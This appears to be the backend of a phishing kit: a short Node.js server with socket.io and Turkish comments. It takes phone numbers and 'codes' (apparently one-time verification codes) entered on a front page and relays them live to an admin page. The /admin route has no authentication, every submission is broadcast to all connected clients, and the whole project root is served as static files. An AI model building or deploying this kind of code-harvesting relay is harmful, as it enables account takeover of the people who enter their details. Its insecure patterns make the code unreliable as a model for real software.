const path = require('path');  // Bu satırı en üstte ekle
const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);

app.use(express.static(path.join(__dirname, "")));  // Root'tan

/* ANA SAYFA */
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "", "index.html"));
});
/* ADMIN SAYFASI */
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "", "admin.html"));
});


// Socket.io bağlantısı
io.on('connection', (socket) => {
  console.log('Bir kullanıcı bağlandı');

  // Frontend'den gelen phone'u al, admin'e broadcast et
  socket.on('new-phone', (phone) => {
    console.log('Yeni telefon: ' + phone);
    io.emit('new-user-phone', phone);  // Admin'e anında gönder (new-user-phone event'i)
  });

  // Frontend'den gelen code'u al, admin'e broadcast et
  socket.on('new-code', (code) => {
    console.log('Yeni code: ' + code);
    io.emit('new-user-code', code);  // Admin'e anında gönder (new-user-code event'i)
  });

  socket.on('disconnect', () => {
    console.log('Kullanıcı ayrıldı');
  });
});

// Sunucuyu dinle (port 3000 veya Heroku port'u)
const port = process.env.PORT || 3000;
http.listen(port, () => {
  console.log(`Sunucu ${port} portunda çalışıyor`);
});